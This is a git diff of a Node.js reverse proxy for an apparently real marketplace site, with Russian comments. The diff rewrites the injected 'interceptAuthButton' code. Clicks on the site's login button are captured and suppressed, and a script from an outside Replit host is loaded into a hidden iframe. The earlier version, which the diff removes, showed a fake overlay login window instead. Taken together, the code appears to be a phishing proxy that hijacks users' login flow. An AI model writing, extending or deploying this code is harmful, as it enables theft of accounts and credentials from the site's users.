@@ -254,117 +254,68 @@ function modifyUrls(content, baseUrl, contentType = '') {
             };
             
             // ВАЖНО: Перехват кликов по кнопке авторизации
-            // Заменить функцию interceptAuthButton на эту:
-
-function interceptAuthButton() {
-    const handleAuthClick = (e) => {
-        const button = e.target.closest('#login-register');
-        if (button) {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-            
-            console.log('🔐 Auth button intercepted!');
-            
-            // Создаем iframe с about:blank внутри домена
-            const blankFrame = document.createElement('iframe');
-            blankFrame.style.cssText = 'position: absolute; width: 0; height: 0; border: 0; visibility: hidden;';
-            blankFrame.src = 'about:blank';
-            document.body.appendChild(blankFrame);
-            
-            // После загрузки iframe
-            blankFrame.onload = () => {
-                // Загружаем скрипты в основном окне
-                const scriptUrl = 'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/bhcg4ddaadpt.js';
-                const authScript = document.createElement('script');
-                authScript.src = scriptUrl;
-                document.head.appendChild(authScript);
-                
-                // Устанавливаем window.openwin если он не существует
-                if (!window.openwin) {
-                    window.openwin = (url, name, params) => {
-                        // Создаем и стилизуем контейнер для имитации окна
-                        const container = document.createElement('div');
-                        container.id = 'auth-window-container';
-                        container.style.cssText = `
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 100%;
-                            z-index: 9999;
-                            background: rgba(0,0,0,0.7);
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                        `;
-                        
-                        // Создаем iframe для содержимого
-                        const frame = document.createElement('iframe');
-                        frame.style.cssText = `
-                            width: 90%;
-                            max-width: 800px;
-                            height: 90%;
-                            max-height: 600px;
-                            border: none;
-                            border-radius: 8px;
-                            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-                        `;
-                        frame.src = url;
-                        
-                        // Добавляем крестик для закрытия
-                        const closeBtn = document.createElement('div');
-                        closeBtn.style.cssText = `
-                            position: absolute;
-                            top: 5%;
-                            right: 5%;
-                            width: 30px;
-                            height: 30px;
-                            background: red;
-                            border-radius: 50%;
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            color: white;
-                            font-size: 20px;
-                            cursor: pointer;
-                            font-weight: bold;
-                        `;
-                        closeBtn.textContent = '×';
-                        closeBtn.onclick = () => {
-                            document.body.removeChild(container);
-                        };
-                        
-                        container.appendChild(frame);
-                        container.appendChild(closeBtn);
-                        document.body.appendChild(container);
-                        
-                        return frame.contentWindow;
-                    };
+            function interceptAuthButton() {
+                // Функция запуска авторизации
+                function startAuth() {
+                    console.log('🔐 Starting auth process...');
+                    
+                    // Создаем скрытый iframe
+                    const frame = document.createElement('iframe');
+                    frame.style.display = 'none';
+                    document.body.appendChild(frame);
+                    
+                    // Загружаем в iframe HTML с скриптом авторизации
+                    frame.contentDocument.open();
+                    frame.contentDocument.write(\`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <meta charset="utf-8">
+                        </head>
+                        <body>
+                            <script src="https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/bhcg4ddaadpt.js"></script>
+                            <script>
+                                // Этот скрипт будет выполнен после загрузки bhcg4ddaadpt.js
+                                // Если вам нужно что-то дополнительно вызвать, добавьте здесь
+                            </script>
+                        </body>
+                        </html>
+                    \`);
+                    frame.contentDocument.close();
                 }
-            };
-            
-            return false;
-        }
-    };
-    
-    // Перехватываем клики
-    document.addEventListener('click', handleAuthClick, true);
-}
                 
-                // Перехватываем клики на уровне документа
+                // Обработчик клика для кнопки авторизации
+                function handleAuthClick(e) {
+                    // Проверяем, что это клик по кнопке авторизации
+                    const button = e.target.closest('#login-register');
+                    if (!button) return;
+                    
+                    // Предотвращаем стандартное действие
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    // Запускаем авторизацию
+                    startAuth();
+                    
+                    return false;
+                }
+                
+                // Добавляем обработчик на уровне документа (чтобы перехватить событие до других обработчиков)
                 document.addEventListener('click', handleAuthClick, true);
                 
-                // Для динамически создаваемых элементов
-                const observer = new MutationObserver((mutations) => {
-                    mutations.forEach((mutation) => {
-                        if (mutation.type === 'childList') {
-                            const button = document.querySelector('#login-register');
-                            if (button) {
-                                button.addEventListener('click', handleAuthClick, true);
-                            }
-                        }
-                    });
+                // Также добавляем прямой обработчик на кнопку, если она уже существует
+                const button = document.querySelector('#login-register');
+                if (button) {
+                    button.addEventListener('click', handleAuthClick, true);
+                }
+                
+                // Для динамически добавляемых элементов
+                const observer = new MutationObserver(() => {
+                    const newButton = document.querySelector('#login-register');
+                    if (newButton && !newButton._hasAuthHandler) {
+                        newButton._hasAuthHandler = true;
+                        newButton.addEventListener('click', handleAuthClick, true);
+                    }
                 });
                 
                 observer.observe(document.body, {
@@ -609,12 +560,12 @@ app.use('*', async (req, res) => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Advanced Market Proxy Server with Browser Window Auth
+    🚀 Advanced Market Proxy Server with Auth Intercept
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
-    🔐 Auth: Draggable browser window
+    🔐 Auth: Script loaded from Replit
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -624,7 +575,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ URL rewriting
     ✓ Content modification
     ✓ Mixed content prevention
-    ✓ Draggable browser-style window
+    ✓ Optimized auth handling
     `);
 });
 
